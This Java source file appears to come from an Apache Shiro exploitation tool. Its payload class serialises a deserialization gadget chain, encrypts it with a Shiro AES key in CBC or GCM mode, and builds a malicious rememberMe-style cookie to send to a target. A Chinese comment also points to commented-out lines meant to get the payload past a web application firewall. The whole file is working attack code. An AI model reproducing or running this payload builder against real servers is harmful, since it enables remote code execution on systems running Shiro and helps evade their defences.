package com.liev.clouds.utils.shiroutils;

import com.liev.clouds.exp.shiro.AttackService;
import com.liev.clouds.payload.shiro.encrypt.CbcEncrypt;
import com.liev.clouds.payload.shiro.encrypt.GcmEncrypt;
import com.liev.clouds.payload.shiro.encrypt.ShiroGCM;
import com.liev.clouds.payload.shiro.FramePayload;
import com.liev.clouds.payload.shiro.util.AesUtil;
import com.mchange.v2.ser.SerializableUtils;

import java.util.Base64;

public class Shiro implements FramePayload {
    public Shiro() {
    }

    @Override
    public String sendpayload(Object ChainObject) throws Exception {
        return null;
    }

    @Override
    public String sendpayload(Object chainObject, String shiroKeyWord, String key) throws Exception {
        byte[] serpayload = SerializableUtils.toByteArray(chainObject);
        byte[] bkey = Base64.getDecoder().decode(key);
        byte[] encryptpayload = null;

        if (AttackService.aesGcmCipherType == 1) {
            ShiroGCM shiroGCM = new ShiroGCM();
            String byteSource = shiroGCM.encrypt(key, serpayload);
            System.out.println(shiroKeyWord + "=" + byteSource);
            return shiroKeyWord + "=" + byteSource;
        } else {
            CbcEncrypt cbcEncrypt = new CbcEncrypt();
            String byteSource = cbcEncrypt.encrypt(key, serpayload);
            System.out.println(shiroKeyWord + "=" + byteSource);
            return shiroKeyWord + "=" + byteSource;
        }

        // 如果需要增加绕过 WAF 的方法，可以解开下面的注释
        // return shiroKeyWord + "=" + "...." + Base64.getEncoder().encodeToString(encryptpayload);
        // return shiroKeyWord + "=" + Base64.getEncoder().encodeToString(encryptpayload);
    }
}
